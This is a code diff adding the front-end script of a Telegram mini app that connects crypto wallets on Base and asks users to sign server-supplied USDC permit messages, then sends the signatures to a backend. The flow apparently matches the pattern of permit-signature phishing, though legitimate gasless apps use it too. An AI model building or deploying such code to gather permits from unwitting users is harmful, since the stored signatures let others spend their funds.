@@ -1,0 +1,204 @@
+﻿import { createAppKit } from "@reown/appkit";
+import { WagmiAdapter } from "@reown/appkit-adapter-wagmi";
+import { base } from "@reown/appkit/networks";
+import { reconnect, watchAccount, switchChain } from "@wagmi/core";
+import { overrideWindowOpen, isTelegramEnvironment } from "@bitget-wallet/omni-connect";
+
+const isTMA = await isTelegramEnvironment();
+if (isTMA) {
+  try { overrideWindowOpen(); } catch (e) { console.warn("overrideWindowOpen failed:", e); }
+}
+
+const tg = window.Telegram?.WebApp;
+tg?.ready();
+tg?.expand();
+
+function getInitData() { return window.Telegram?.WebApp?.initData || ""; }
+
+const projectId = "805fb07ea7baed60aacb672825ad36a9";
+const metadata = { name: "Telegram Crypto Worker", description: "Sign USDC permits", url: location.origin, icons: [] };
+const wagmiAdapter = new WagmiAdapter({ projectId, networks: [base], metadata });
+
+const featuredWalletIds = isTMA
+  ? ["21c3a371f72f0057186082edb2ddd43566f7e908508ac3e85373c6d1966ed614"]
+  : undefined;
+
+const modal = createAppKit({
+  adapters: [wagmiAdapter], networks: [base], projectId, metadata,
+  features: { analytics: false }, featuredWalletIds,
+});
+
+reconnect(wagmiAdapter.wagmiConfig);
+
+const bitgetBtn = document.getElementById("bitget-btn");
+const evmBtn = document.getElementById("evm-btn");
+const signBtn = document.getElementById("sign");
+const statusEl = document.getElementById("status");
+const copyLinkBtn = document.getElementById("copy-link");
+let currentAddress = null;
+let metamaskProvider = null;
+
+const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) ||
+  (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+
+function setStatus(msg, kind) {
+  statusEl.className = "status" + (kind ? " " + kind : "");
+  statusEl.textContent = msg;
+}
+
+function showCopyFallback() {
+  if (!copyLinkBtn) return;
+  copyLinkBtn.style.display = "inline-block";
+  copyLinkBtn.onclick = async () => {
+    try {
+      await navigator.clipboard.writeText(location.href);
+      setStatus("Link copied. Open Safari and paste it.", "ok");
+    } catch {
+      window.prompt("Copy this link and open it in Safari:", location.href);
+    }
+  };
+}
+
+function parseSignatureHex(sigHex) {
+  const hex = sigHex.startsWith("0x") ? sigHex.slice(2) : sigHex;
+  if (hex.length === 130) {
+    const r = "0x" + hex.slice(0, 64);
+    const s = "0x" + hex.slice(64, 128);
+    let v = parseInt(hex.slice(128, 130), 16);
+    if (v < 27) v += 27;
+    return { r, s, v };
+  }
+  if (hex.length === 128) {
+    const r = "0x" + hex.slice(0, 64);
+    const yParityAndS = hex.slice(64, 128);
+    const yParity = parseInt(yParityAndS.slice(0, 2), 16) >> 7;
+    const sVal = (BigInt("0x" + yParityAndS) & ((1n << 255n) - 1n)).toString(16).padStart(64, "0");
+    return { r, s: "0x" + sVal, v: yParity + 27 };
+  }
+  throw new Error("Unsupported signature format");
+}
+
+async function ensureBaseChain() {
+  try { await switchChain(wagmiAdapter.wagmiConfig, { chainId: base.id }); } catch {}
+}
+
+bitgetBtn.addEventListener("click", () => { modal.open(); });
+
+evmBtn.addEventListener("click", async () => {
+  if (isTMA) {
+    try {
+      window.Telegram.WebApp.openLink(location.href, { try_instant_view: false });
+    } catch {
+      window.Telegram.WebApp.openLink(location.href);
+    }
+    if (isIOS) {
+      setStatus("If Safari didn't open, copy the link below and paste it into Safari.", "error");
+      showCopyFallback();
+    } else {
+      setStatus("Opening in Chrome…", "ok");
+    }
+    return;
+  }
+
+  setStatus("Connecting via MetaMask…");
+  evmBtn.disabled = true;
+
+  try {
+    const { createEVMClient } = await import("@metamask/connect-evm");
+    const evmClient = await createEVMClient({
+      dapp: {
+        name: "Telegram Crypto Worker",
+        url: location.origin + location.pathname,
+        iconUrl: location.origin + "/icon.png",
+      },
+      api: {
+        supportedNetworks: {
+          "0x2105": "https://mainnet.base.org",
+        },
+      },
+      ui: {
+        preferExtension: true,
+      },
+      mobile: {
+        preferredOpenLink: (deeplink) => {
+          window.open(deeplink, "_blank");
+        },
+      },
+    });
+
+    const provider = evmClient.getProvider();
+    const { accounts, chainId } = await evmClient.connect({ chainIds: ["0x2105"] });
+
+    if (accounts?.[0]) {
+      currentAddress = accounts[0];
+      metamaskProvider = provider;
+      signBtn.disabled = false;
+      setStatus("Connected: " + currentAddress.slice(0, 6) + "… (chain " + chainId + ")", "ok");
+    }
+  } catch (e) {
+    const code = e.code || e.rpcCode;
+    if (code === 4001) {
+      setStatus("User rejected connection.", "error");
+    } else if (code === -32002) {
+      setStatus("Connection pending. Check MetaMask.", "error");
+    } else {
+      setStatus(e.message || String(e), "error");
+    }
+  } finally {
+    evmBtn.disabled = false;
+  }
+});
+
+watchAccount(wagmiAdapter.wagmiConfig, {
+  onChange(account) {
+    if (account.address) {
+      currentAddress = account.address;
+      signBtn.disabled = false;
+    }
+  }
+});
+
+signBtn.onclick = async () => {
+  if (!currentAddress) return;
+  const initData = getInitData();
+  const urlToken = new URLSearchParams(location.search).get("token");
+  const authHeader = initData ? "tma " + initData : "Bearer " + urlToken;
+
+  const provider = metamaskProvider || window.ethereum;
+  if (!provider) { setStatus("No wallet provider. Connect first.", "error"); return; }
+
+  signBtn.disabled = true;
+  try {
+    await ensureBaseChain();
+    setStatus("Preparing permit…");
+    const prepRes = await fetch("/api/permit-data", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "Authorization": authHeader },
+      body: JSON.stringify({ address: currentAddress }),
+    });
+    const prepData = await prepRes.json().catch(() => ({}));
+    if (!prepRes.ok) throw new Error(prepData.error || "permit-data failed");
+
+    const { sessionId, typedData } = prepData;
+    setStatus("Sign permit…");
+    const signature = await provider.request({
+      method: "eth_signTypedData_v4",
+      params: [currentAddress, JSON.stringify(typedData)],
+    });
+    const { r, s, v } = parseSignatureHex(signature);
+
+    setStatus("Submitting…");
+    const saveRes = await fetch("/api/signature", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "Authorization": authHeader },
+      body: JSON.stringify({ sessionId, v, r, s }),
+    });
+    const result = await saveRes.json().catch(() => ({}));
+    if (!saveRes.ok) throw new Error(result.error || "signature save failed");
+    setStatus("Permit signed and saved.", "ok");
+  } catch (e) {
+    setStatus(e.message || String(e), "error");
+  } finally {
+    signBtn.disabled = !currentAddress;
+  }
+};
